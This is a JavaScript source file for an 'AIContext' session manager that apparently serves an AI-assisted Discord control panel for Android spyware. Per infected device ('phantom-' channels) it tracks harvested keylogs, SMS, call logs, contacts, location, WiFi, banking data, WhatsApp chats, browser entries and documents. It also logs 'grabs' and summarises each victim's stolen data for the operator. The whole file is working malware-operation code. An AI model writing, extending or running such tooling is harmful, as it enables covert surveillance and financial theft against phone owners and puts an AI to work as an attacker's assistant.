export class AIContext {
  constructor() {
    this.sessions = new Map()
  }

  getSession(guildId, userId) {
    const guildSessions = this.sessions.get(guildId)
    if (!guildSessions) return null
    return guildSessions.get(userId) || null
  }

  createSession(guildId, userId) {
    if (!this.sessions.has(guildId)) this.sessions.set(guildId, new Map())
    const session = {
      userId,
      guildId,
      active: true,
      currentTarget: null,
      deviceKnowledge: new Map(),
      conversationHistory: [],
      pendingProposal: null,
      grabHistory: [],
      createdAt: Date.now(),
      lastActivity: Date.now(),
    }
    this.sessions.get(guildId).set(userId, session)
    return session
  }

  deleteSession(guildId, userId) {
    const guildSessions = this.sessions.get(guildId)
    if (guildSessions) guildSessions.delete(userId)
  }

  updateDeviceKnowledge(session, chId, key, value) {
    if (!session.deviceKnowledge.has(chId)) {
      session.deviceKnowledge.set(chId, {
        model: '?',
        android: '?',
        ip: '?',
        owner: null,
        contacts: [],
        apps: [],
        location: null,
        lastSeen: null,
        keylog: [],
        sms: [],
        callLog: [],
        wifi: [],
        banks: [],
        whatsapp: [],
        chrome: [],
        docs: [],
        notes: [],
      })
    }
    const device = session.deviceKnowledge.get(chId)
    device[key] = value
    device.lastSeen = Date.now()
    session.lastActivity = Date.now()
  }

  addGrabRecord(session, chId, grabType, summary) {
    if (!session.grabHistory) session.grabHistory = []
    session.grabHistory.push({
      chId,
      type: grabType,
      summary: summary.slice(0, 200),
      timestamp: Date.now(),
    })
    session.lastActivity = Date.now()
  }

  getGrabHistory(session, chId = null) {
    if (!session.grabHistory) return []
    if (chId) return session.grabHistory.filter(g => g.chId === chId)
    return session.grabHistory
  }

  addToHistory(session, role, content) {
    session.conversationHistory.push({ role, content, timestamp: Date.now() })
    if (session.conversationHistory.length > 30) {
      session.conversationHistory.shift()
    }
    session.lastActivity = Date.now()
  }

  setPendingProposal(session, proposal) {
    session.pendingProposal = proposal
    session.lastActivity = Date.now()
  }

  clearPendingProposal(session) {
    session.pendingProposal = null
  }

  summarizeDeviceKnowledge(session) {
    const summary = []
    for (const [chId, dev] of session.deviceKnowledge) {
      const name = dev.model !== '?' ? dev.model : chId.replace('phantom-', '')
      summary.push(`Device: ${name} (${chId})`)
      if (dev.owner) summary.push(`  Owner: ${dev.owner}`)
      if (dev.location) summary.push(`  Location: ${dev.location}`)
      summary.push(`  Contacts: ${dev.contacts.length}`)
      summary.push(`  Apps: ${dev.apps.length}`)
      summary.push(`  Banks: ${dev.banks.length}`)
      summary.push(`  WhatsApp chats: ${dev.whatsapp.length}`)
      summary.push(`  Chrome entries: ${dev.chrome.length}`)
      summary.push(`  Documents: ${dev.docs.length}`)
      summary.push(`  SMS: ${dev.sms.length} messages`)
      summary.push(`  IP: ${dev.ip}`)
      summary.push(`  Last seen: ${dev.lastSeen ? new Date(dev.lastSeen).toISOString() : 'never'}`)

      const grabs = this.getGrabHistory(session, chId)
      if (grabs.length > 0) {
        summary.push(`  Grabs: ${grabs.length} total`)
        for (const g of grabs.slice(-3)) {
          summary.push(`    • ${g.type} at ${new Date(g.timestamp).toLocaleTimeString()}`)
        }
      }
    }
    return summary.join('\n')
  }

  cleanup(maxAgeMs = 3600000) {
    const now = Date.now()
    for (const [guildId, guildSessions] of this.sessions) {
      for (const [userId, session] of guildSessions) {
        if (now - session.lastActivity > maxAgeMs) {
          guildSessions.delete(userId)
        }
      }
      if (guildSessions.size === 0) this.sessions.delete(guildId)
    }
  }

  getStats() {
    let total = 0
    for (const guildSessions of this.sessions.values()) total += guildSessions.size
    return { sessions: total, guilds: this.sessions.size }
  }
}

export const aiContext = new AIContext()
